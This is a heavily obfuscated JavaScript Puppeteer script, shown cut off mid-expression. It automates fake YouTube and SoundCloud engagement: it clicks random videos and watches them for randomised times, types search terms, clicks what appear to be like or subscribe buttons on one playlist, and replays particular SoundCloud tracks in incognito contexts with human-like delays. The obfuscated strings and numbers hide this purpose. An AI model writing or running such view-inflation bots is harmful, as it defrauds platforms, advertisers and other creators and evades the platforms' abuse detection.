const Z = d,
  Y = b,
  X = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0xffd + -0x2039 + 0x1 * 0x103d))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xbf4 + -0x1bc1 * -0x1 + 0x6b * -0x5f), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xe7d8 + -0x7e1b + 0x11 * 0x1bf3 + (-0x5f28 + -0x1 * 0x718b + 0x10b4b) * random()) : await standardWaitForNetIdle(f), await wait(0x150f + 0x2 * 0x59f + 0x1d3 * -0x7 + (-0x226d + 0x3a89 + 0x1 * 0xef4) * random()), -0x74f * -0x2 + 0x2450 + 0x32ed * -0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0xfa * -0x18 + 0x162f + -0x1a17 * 0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x148f + -0x486 * -0x7 + -0x1168 * 0x3;
}
async function randomWait() {
  return await wait(0x53 * 0x25 + -0xdc3 + 0x154c * 0x1 + (-0x3 * 0x7e2 + 0x600 + 0x252e * 0x1) * random()), 0xd10 + -0x17df + 0xad0;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x15c + -0xa5f + 0x903, 0x7 * -0x4ae + 0x1d5d + 0x124 * 0x3), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x15183 + 0x9ea2 + -0x105c5) * getRandomInt(0xcde * 0x2 + 0x122c * -0x1 + -0x3c7 * 0x2, -0x14d1 * 0x1 + 0x24cd + 0xff7 * -0x1), h)), -0xf22 * -0x2 + -0x7 * -0x44b + -0x3c50;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x4fd * -0x1 + -0x1519 * -0x1 + -0x101c;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x3 * -0x91d + -0x24f4 + 0x99e]['split']('\x20');
    for (let k = -0x1 * 0x5f3 + 0xbcd + -0x5da; k < i['length']; k += -0x220a + -0x1068 + 0x3274)
      j += i[k] * h[i[k + (-0x1cd * -0x9 + -0x23e0 + 0x13ac)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1dde * -0x1 + -0x2 * -0x74f + -0xed2 * 0x3)['map'](l => Array['from'](l['children']))['flat'](0x18a7 + 0x9 * 0x133 + -0x2371)['map'](l => l['childNodes'][0x1 * 0x407 + 0x2 * -0x10a5 + -0x1d44 * -0x1]['childNodes'][0x1 * 0x1036 + -0x21a * 0xd + -0x12 * -0x9e]['childNodes'][-0x17ca + 0x62 + 0xd * 0x1cd]['childNodes'][-0x24c + -0x2081 * -0x1 + 0x197 * -0x13]['childNodes'][-0xb45 * -0x1 + 0x26e9 + 0xa09 * -0x5]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x50f * 0x2 + 0x44d + -0x1 * -0x9b9, 0x180d + -0x75a + -0x2d5 * -0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x16d0 + 0x33a1 + 0x1dc7);
  const h = await getMaxTime(f),
    i = Math['min']((0x10c55 + -0x2 * 0x13f9 + -0x7 * -0xdb) * getRandomInt(0x29 * -0x55 + -0x1 * 0x931 + 0x16d0, 0x1d1f + 0xc4c + -0x2966), h);
  return await wait(i), -0x287 * -0x4 + 0x1 * 0xb3f + 0x1 * -0x155a;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = d;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math[R(0x9)](Math['random']() * h['length'])])['children'][-0xf * 0x125 + 0x11e4 + -0xb9]['children'][0x261c + -0x1a12 + -0xc0a]['children'][-0x11d1 + 0x4 * -0x883 + -0xb * -0x4b7]['children'][-0x319 * 0x1 + -0x1916 + 0x1c2f]['children'][-0x1195 + 0x2 * -0x98e + 0x24b1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x2258 + 0x4b5 + -0x270c;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1738 + 0x182d + -0x2f65);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const S = b;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j[S(0x5, '[#40')](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x2645 + 0x8 * -0x423 + -0x4c9 + (-0x367 * -0x1 + -0x975 + -0x50 * -0x14) * random()
  }), await wait(-0x24df + 0xfd * -0x1 + -0x5b * -0x70 + (0x36a * -0x1 + -0x1be6 + -0x84 * -0x3f) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1d5a + -0x37e * -0x1 + 0x19de]['childNodes'][0x1b8b + 0xf4d + -0x2ad7]['childNodes'][0x6fd * 0x5 + 0x59f * -0x4 + 0x2 * -0x63a]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1 * 0x2513 + 0x2 * -0x971 + -0xa * -0x599]['childNodes'][-0x1 * -0x11ee + 0x3 * -0x307 + -0x8d9]['childNodes'][0x11a * -0x21 + -0x22 * 0xa3 + 0x3a02]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x3 * 0xbe1 + 0x1a47 + 0x31f * 0x3),
          r = 0x7bb * 0x5 + -0x1b8d + -0xb1a;
        for (let u = 0x2 * 0x817 + 0x1 * -0xf06 + -0x4a * 0x4; u < q['length']; u += -0x1ff6 + 0x1 * 0x243d + -0x445)
          r += q[u] * k[q[u + (0x2 * -0xfb7 + 0x2de * 0xd + -0x5d7)]];
        return r;
      }(n);
  });
  await wait((-0x5645 + 0x1efe + 0x71df) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1312 * -0x2 + 0x1 * 0xaeb9 + 0x1 * 0x1583) * getRandomInt(0x1e13 + -0x6 * -0x3d2 + -0x26 * 0x165, 0x14f4 + -0x144 + -0x13a6), h + (-0x739 + -0x1 * 0x2202 + -0x1 * -0x3cc3));
  return await wait(i), -0x8c6 * -0x4 + -0x22a9 * -0x1 + -0x45c0;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1738 + 0x182d + -0x2f65);
    let h = e[f];
    if (c['jEtAOe'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x76 * 0x53 + -0x1 * 0xc15 + 0x1a2d * -0x1, r, s, t = 0x25 * -0xdd + 0x11 * 0x6b + 0x18d6; s = m['charAt'](t++); ~s && (r = q % (0x3 * -0x57d + 0x134 * -0x18 + 0x2d5b) ? r * (0x509 * 0x1 + -0x266f + 0x21a6) + s : s, q++ % (0x5 * -0x3db + -0x18a1 + 0x2bec)) ? o += String['fromCharCode'](-0x646 + 0x1d90 + 0xd * -0x1b7 & r >> (-(0x1dc8 * -0x1 + -0x3 * -0xa3d + -0x1 * 0xed) * q & 0x2b * -0xde + 0xe55 * 0x2 + 0x8a6)) : 0x2de * -0x6 + 0x5 * 0x579 + -0xa29) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1baf + 0x4db * 0x3 + 0xd1e, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x17e * -0x2 + -0x25 * 0xc1 + 0x853 * 0x3))['slice'](-(-0xb7 * 0x1b + 0x26a2 * 0x1 + -0x1353));
        }
        return decodeURIComponent(p);
      };
      c['hdywzn'] = i, b = arguments, c['jEtAOe'] = !![];
    }
    const j = e[0x8 * -0x2ea + 0x5bb + 0x1195],
      k = f + j,
      l = b[k];
    return !l ? (h = c['hdywzn'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  const T = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + T(0x7, '8pll') + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1 * 0x1c6b + -0x2e5 + 0x1f50), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xd96 + 0xd83 + 0xbcb + (-0x1 * -0x2339 + 0x11b * 0x1 + -0x206c) * Math['random']());
    });
  }, 0x3 * -0xa8 + -0xbf9 + -0x1 * -0x2949);
  await wait(0x76f10 + 0x7e31d + -0xb * 0xfa07);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x8e02 + 0x1be9 + 0x4075) * getRandomInt(-0x3b + 0x110e + -0x10cf, -0x1 * 0x117f + -0x15ec + 0x2784)), clearInterval(h), 0x122 * -0x4 + -0x47 * 0x3b + 0x14e6;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x172f + 0x36 * -0x33 + -0x1 * 0xc6d;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x604 * 0x2 + 0x833 * 0x4 + -0x2cd3;
    await randomWait();
  }
  return -0xf14 + -0x5 * -0x117 + 0x2 * 0x4d1;
}

function fetchRandomSC() {
  const U = c;
  return Math['random']() <= -0x1 * -0x2487 + 0x1 * -0x1633 + -0x72a * 0x2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xd69 * 0x1 + -0x2390 + -0x6ff * -0x7 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + U(0x12) + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1738 + 0x182d + -0x2f65);
    let h = e[f];
    if (b['yHMoip'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x76 * 0x53 + -0x1 * 0xc15 + 0x1a2d * -0x1, s, t, u = 0x25 * -0xdd + 0x11 * 0x6b + 0x18d6; t = n['charAt'](u++); ~t && (s = r % (0x3 * -0x57d + 0x134 * -0x18 + 0x2d5b) ? s * (0x509 * 0x1 + -0x266f + 0x21a6) + t : t, r++ % (0x5 * -0x3db + -0x18a1 + 0x2bec)) ? p += String['fromCharCode'](-0x646 + 0x1d90 + 0xd * -0x1b7 & s >> (-(0x1dc8 * -0x1 + -0x3 * -0xa3d + -0x1 * 0xed) * r & 0x2b * -0xde + 0xe55 * 0x2 + 0x8a6)) : 0x2de * -0x6 + 0x5 * 0x579 + -0xa29) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1baf + 0x4db * 0x3 + 0xd1e, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x17e * -0x2 + -0x25 * 0xc1 + 0x853 * 0x3))['slice'](-(-0xb7 * 0x1b + 0x26a2 * 0x1 + -0x1353));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x8 * -0x2ea + 0x5bb + 0x1195,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x18 * 0x1a0 + -0x10a8 + 0x37a8; u < 0x2 * -0x1e7 + -0x2 * 0x1061 + 0x12c8 * 0x2; u++) {
          p[u] = u;
        }
        for (u = 0x1c21 + 0xd38 + -0x2959; u < 0xcde * 0x2 + 0x122c * -0x1 + -0x50 * 0x15; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x14d1 * 0x1 + 0x24cd + 0xefc * -0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xf22 * -0x2 + -0x7 * -0x44b + -0x3c51, q = 0x4fd * -0x1 + -0x1519 * -0x1 + -0x101c;
        for (let v = -0x3 * -0x91d + -0x24f4 + 0x99d; v < n['length']; v++) {
          u = (u + (-0x1 * 0x5f3 + 0xbcd + -0x5d9)) % (-0x220a + -0x1068 + 0x3372), q = (q + p[u]) % (-0x1cd * -0x9 + -0x23e0 + 0x14ab), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1dde * -0x1 + -0x2 * -0x74f + -0xadf * 0x4)]);
        }
        return t;
      };
      b['gBUgtB'] = m, c = arguments, b['yHMoip'] = !![];
    }
    const j = e[0x18a7 + 0x9 * 0x133 + -0x2372],
      k = f + j,
      l = c[k];
    return !l ? (b['MWZGmC'] === undefined && (b['MWZGmC'] = !![]), h = b['gBUgtB'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xc62 + 0x467 + 0x7fb + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1665 + -0x1 * -0x1262 + -0x28c7;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x2843 * -0x6 + -0x11f72 + 0x2 * 0x16066 + getRandomInt(0x16ca + -0x3f * -0x1b1 + 0x46c1 * -0x1, -0xb101 + 0x1 * 0xbcf3 + -0x13 * -0x58a));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1ad0 + 0xec3 + 0xc0e * 0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1cdf + -0x1 * -0x1327 + 0x3 * -0x1002;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0xd5 + -0x2eb * 0x6 + 0x3 * 0x58f, -0x1d3c * 0x1 + -0x18d9 + -0x7c1 * -0x7)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x93b * 0x1 + -0x2 * 0x2e3 + 0x16d1 + floor((0xa4 + 0xaff + 0x7bb * -0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xe9f25470 + -0x194abcbe + -0xf51 * 0x54412),
          -0x1 * -0x33dd5a + 0x1 * 0x49e194 + 0x24112,
          -0x6cc9 + -0xa0a * 0x7 + 0x1 * 0x1330f,
          -0x1589 + -0x17 * -0x27 + -0x4 * -0x4a2
        ], y = [
          -0xda2 + -0x416 + 0x11d0,
          0x858 + -0xa2 * -0x2d + 0x3ad * -0xa,
          -0x1 * -0x2245 + -0xc30 + -0x160d,
          0x1582 * 0x1 + 0xc28 * 0x2 + -0x159 * 0x22
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1 * -0xdc9 + 0x2 * 0x597 + -0x18f6)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2 * -0x530 + -0x1aca + 0x106a; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1896 + 0x2bd * 0xb + -0x589) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x6 * -0x2cf + 0x3 * 0xbed + -0x12ed] = A[0x2415 + 0x1ed2 + -0x42d7] = A[0x1c3d * 0x1 + 0x12a9 + 0x31 * -0xf5] = A[-0x1 * -0x303 + -0x12e6 + 0xfe5] = A[-0x1 * 0x1d0b + -0x3c * -0x1 + -0xe69 * -0x2] = A[-0x1de + 0x2 * -0x65b + 0x2 * 0x74c] = A[-0x10cd + 0x1743 * 0x1 + -0x671] = A[-0x3 * -0x260 + -0xa10 + 0x2f6] = A[0x1500 + 0x994 + 0x63 * -0x4f] = A[-0x2d4 * 0x7 + 0xa * 0x3a9 + -0x10c6] = A[-0x20e6 + 0x1be3 + 0x44 * 0x13] = A[0x10 * -0x184 + 0xc4b + 0xbff] = A[0x1 * -0x169f + -0x1 * 0x2334 + -0x1 * -0x39de] = A[-0x1 * 0x2ae + -0xb9 + 0x373] = A[-0xd26 + 0x21c5 + -0x1492 * 0x1] = A[0x1 * 0x275 + -0x1201 + -0x7cd * -0x2] = A[-0xbb * -0x32 + -0x11a7 + -0x968 * 0x2] = 0x20ca + -0xd2f + -0x689 * 0x3, this['blocks'] = A) : this['blocks'] = [
                0x1b91 + -0x1f29 + 0x398,
                0x2619 * -0x1 + -0x177d + 0x3d96,
                -0xf4b + -0xe31 + -0x1d7c * -0x1,
                0x144d + -0x3c1 * -0xa + -0x39d7 * 0x1,
                0xc56 * 0x1 + -0xf51 + 0x2fb,
                -0x11 * -0xfa + -0x1737 + 0x69d * 0x1,
                -0x200a * 0x1 + 0x80 * -0x47 + 0x438a,
                0x1 * -0x10ef + -0x1fd0 + 0x30bf * 0x1,
                0x1d5 * 0x14 + 0x1403 + 0x1 * -0x38a7,
                0x1cf0 + -0x1 * -0x1369 + 0x3059 * -0x1,
                0x17 * -0xf1 + 0x2161 + 0x9e * -0x13,
                0x869 * 0x2 + 0x196d + -0x203 * 0x15,
                -0x119b + 0x4e5 * -0x1 + -0x3c0 * -0x6,
                -0xe9b * -0x2 + -0x65e + 0x56 * -0x44,
                -0x1 * 0x18f1 + -0x2573 + -0x533 * -0xc,
                0x1f74 + 0x1 * -0x1ac9 + -0x4ab,
                0x59 * 0x3e + -0x24db + 0xf4d
              ], this['h0'] = -0x3c520004 + 0x532486c3 + 0x50729c42, this['h1'] = 0x238c1a7f * 0x2 + 0xb558059f * -0x1 + 0x15e0d7c2a, this['h2'] = 0x2ad5832d * 0x7 + -0x3a7bc * -0x4303 + -0x1880ce471, this['h3'] = 0x1 * 0x37ded10 + -0x8cf6058 * 0x3 + 0x2b1a2 * 0xe87, this['h4'] = -0x13149183d * 0x1 + -0x1313af01 + 0x2082fa92e, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x2225 + -0x1 * -0x1424 + -0xef * -0xf, this['finalized'] = this['hashed'] = -0x35 * -0x5d + -0x1e4 * -0x7 + -0x1 * 0x207d, this['first'] = -0x169 * 0x13 + 0x1 * 0x10c1 + 0xa0b;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x35a + 0x1157 + -0x14b1, O = J['length'] || -0x3d6 * 0x1 + -0xd10 + -0x6 * -0x2d1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x39d * 0x8 + -0x7 * 0x2d9 + 0x30d7, P[0xc73 * -0x2 + -0x2 * 0xa49 + 0x2d78] = this['block'], P[-0x25 * -0x3b + 0x1565 * -0x1 + -0xcee * -0x1] = P[-0x262 * -0x6 + 0x119f + 0xd7 * -0x26] = P[-0x11 * -0xb7 + -0x19c1 + 0xd9c] = P[-0x9ef * -0x3 + -0x11cb + -0xbff] = P[-0x52b + -0x1d * 0xad + 0x18c8] = P[-0xd5 * 0xf + 0x7e * -0x43 + 0x2d7a] = P[0x554 + -0x173c + 0x132 * 0xf] = P[-0x1 * -0x16c9 + -0x22d2 + 0xc10] = P[0x1d * 0xa7 + -0xa6d + -0x2d2 * 0x3] = P[-0x1 * 0x1b9d + 0x1628 + 0x57e] = P[-0xc * 0xca + -0x1 * 0x2456 + -0x3d2 * -0xc] = P[-0x10d + -0x1 * -0xd03 + -0xbeb] = P[0xb5d + -0x136f + -0x40f * -0x2] = P[-0x13bb + -0x1e1d + 0x31e5] = P[-0x1ee6 * 0x1 + 0x1f07 + -0x1 * 0x13] = P[-0x2f6 + -0x1e8 * -0x10 + -0x1b7b] = -0xd * -0xa7 + -0xff * 0x1c + 0x1369), K) {
                    for (N = this['start']; M < O && N < -0xb15 * -0x2 + 0x1dde + -0x33c8; ++M)
                      P[N >> -0xc72 + -0xcd * -0x21 + -0xdf9] |= J[M] << y[0x841 + 0x1a79 * -0x1 + 0x123b & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x2 * 0x844 + 0x1067 * -0x1 + 0x1 * 0x1f; ++M)
                      (L = J['charCodeAt'](M)) < 0x1680 + 0x548 * 0x1 + -0x1b48 ? P[N >> -0x2d * 0x7c + -0x251c + 0x3aea] |= L << y[-0x1369 * -0x2 + 0xbbb + -0x328a & N++] : L < -0x19d1 + 0x2598 + -0x3c7 ? (P[N >> -0x201f + -0x1460 + -0x3481 * -0x1] |= (-0x13 * 0xc2 + -0x1 * 0x8c6 + 0x17ec * 0x1 | L >> -0x24de + 0x236d + 0x177) << y[-0x59 * 0xb + 0x43f + 0x3 * -0x23 & N++], P[N >> 0x5e9 + -0x2 * 0x1161 + -0x1cdb * -0x1] |= (-0x1d22 + -0xea9 + 0x2c4b | 0x2 * 0x114e + 0x1 * -0x8a9 + -0x19b4 & L) << y[-0x26 * -0x107 + -0xb02 + -0x1c05 * 0x1 & N++]) : L < 0x15302 + 0x1 * -0xf1c1 + 0x2795 * 0x3 || L >= -0x240b * 0x1 + 0x2 * -0x9fe2 + -0x3 * -0xc145 ? (P[N >> -0xa38 + 0x1aff * -0x1 + 0x2539] |= (0x8cb + 0xa29 + -0x1214 | L >> 0x132c + 0x2ec + -0x160c) << y[-0xe4f + -0x6b1 + 0x1503 & N++], P[N >> 0x62b * -0x3 + 0x1 * 0x1df7 + 0x2 * -0x5ba] |= (0x9a5 + 0x32b * 0x1 + 0x4 * -0x314 | L >> -0x1 * -0x293 + 0x1df * 0x14 + 0x17b * -0x1b & -0x112b + 0xab0 + 0x3 * 0x23e) << y[-0xbd3 + -0x1188 + 0xe * 0x219 & N++], P[N >> 0xd07 * -0x1 + -0x1930 + 0x5 * 0x7a5] |= (-0x1 * -0x40f + -0x2 * -0x8df + -0x154d | 0x447 * 0x3 + -0x220 + -0xa76 & L) << y[-0x16e0 + 0x734 + -0xb * -0x16d & N++]) : (L = -0xf8be * 0x1 + -0x9b24 + 0x293e2 + ((-0x26aa + -0x11 * -0x207 + -0x832 * -0x1 & L) << 0x1 * 0x148a + 0x1ff4 + -0x3474 | -0x1a7e + 0x2 * 0xa8 + -0x2a7 * -0xb & J['charCodeAt'](++M)), P[N >> 0xf9 * 0x21 + -0x1f47 + 0x34 * -0x4] |= (-0x3 * 0xc73 + 0xb6f * 0x1 + 0x1ada | L >> -0x17f * -0xb + -0x2635 + 0x15d2) << y[-0x1a60 + 0x1 * 0x1c13 + -0x8 * 0x36 & N++], P[N >> 0x16bb + 0x62f * -0x1 + 0x108a * -0x1] |= (-0x9af + 0x21 * 0xd1 + -0x10c2 | L >> -0x1 * -0xe19 + -0x2524 + 0x1717 & 0x26 * 0xc9 + -0x1cba * 0x1 + 0xd * -0x11) << y[-0x1 * -0x7a9 + 0x1a77 + 0x29 * -0xd5 & N++], P[N >> 0x21 * -0x129 + -0x215 + -0x11 * -0x260] |= (-0x11 * -0xf8 + -0x2f7 * 0x8 + 0x7c0 | L >> 0x186b + -0x1 * 0x1f9f + 0x1 * 0x73a & -0xa * -0x3d9 + 